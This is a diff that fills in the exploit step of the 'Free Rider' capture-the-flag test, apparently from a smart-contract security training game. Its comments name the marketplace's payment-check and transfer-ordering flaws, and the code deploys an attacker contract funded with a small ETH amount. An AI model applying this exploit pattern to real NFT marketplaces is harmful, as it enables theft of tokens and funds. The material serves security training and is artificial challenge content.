@@ -105,6 +105,20 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Two things wrong here
+        // The check msg.value >= priceToPay
+        // And transferring token to new owner before paying the seller
+        const FreeRiderAttackerFactory = await ethers.getContractFactory("FreeRiderAttacker", deployer);
+        const freeRiderAttacker = await FreeRiderAttackerFactory.deploy();
+        await freeRiderAttacker.connect(attacker).attack(
+            this.uniswapFactory.address,
+            this.weth.address,
+            this.uniswapPair.address,
+            this.marketplace.address,
+            this.buyerContract.address,
+            this.nft.address,
+            {value: ethers.utils.parseEther("0.45")}
+        );
     });
 
     after(async function () {
